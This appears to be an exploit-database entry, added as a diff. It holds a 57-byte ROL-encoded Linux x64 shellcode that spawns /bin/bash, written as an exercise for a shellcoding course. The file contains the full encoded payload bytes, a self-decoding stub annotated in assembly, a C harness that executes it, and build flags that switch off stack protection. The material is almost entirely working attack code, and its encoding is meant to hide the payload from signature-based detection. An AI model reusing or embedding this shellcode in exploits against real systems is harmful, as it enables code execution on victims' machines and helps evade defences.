@@ -1,0 +1,52 @@
+id: 34324
+date: 04/27/2020
+title: Linux/x64_86 ROL Encoded Execve Shellcode (57 bytes)
+author: Bobby Cooke
+cves: 
+
+// Shellcode Title:  Linux/x64 - ROL Encoded Execve Shellcode (57 bytes)
+// Shellcode Author: Bobby Cooke
+// Tested On:        Kali Linux 5.3.0-kali3-amd64 x86_64
+// Description:      Encoded Execve /bin/bash shellcode for Linux x64_86 systems.The stub decodes the ROL Encoded shellcode. When the stub finished decoding the payload, execution control is passed to the payload.
+// SLAE/Student ID: PA-10913
+// Course: This shellcode was created for the x86_64 Assembly Language and Shellcoding on Linux (SLAE64) Course offered at pentesteracademy.com.
+// Shoutout:         skape, vivek, offsec, corelan
+// Usage:
+//   root# gcc -m64 -z execstack -fno-stack-protector shellcode.c -o shellcode
+//   root# echo $$ | xargs ps
+//       PID TTY      STAT   TIME COMMAND
+//      3067 pts/3    Ss     0:00 /bin/bash
+//   root# ./shellcode
+//   Shellcode Length:  57
+//   root# echo $$ | xargs ps
+//       PID TTY      STAT   TIME COMMAND
+//      3501 pts/3    S      0:00 [bash]
+
+#include<stdio.h>
+#include<string.h>
+
+unsigned char shellcode[] = \
+"\xeb\x0d"              // jmp short call_decoder
+// decoder:
+"\x5e"                  // pop rsi = &String
+// decode:
+"\xd0\x0e"              // ror byte [rsi], 1  
+"\x80\x3e\x55"          // cmp byte [rsi], 0x55 - last byte? ror 0xaa, 1 = 0x55
+"\x74\x0a"              // je Shellcode - End? Jump to shellcode!
+"\x48\xff\xc6"          // inc rsi - Not end? move 2 next byte
+"\xeb\xf4"              // jmp short decode - loop 2 decode next byte
+// call_decoder:
+"\xe8\xee\xff\xff\xff"  // call decoder // go 2 decode loop
+// Execve(/bin/bash) ROL Encoded Shellcode
+"\x90\x62\xed\x90\xef\xcd\x90\x62\xff\xae\x90\x07\x85"
+"\xd0\xa4\x90\x75\x5e\xc4\xd2\xdc\x5e\xc4\xc2\xe6\xa4"
+"\x90\x62\xa5\x90\x13\xcf\x61\x76\x1e\x0a\xaa";
+
+int main()
+{
+        printf("Shellcode Length:  %d\n", strlen(shellcode));
+        int (*ret)() = (int(*)())shellcode;
+        ret();
+}
+
+#  0day.today [2023-03-27]  #
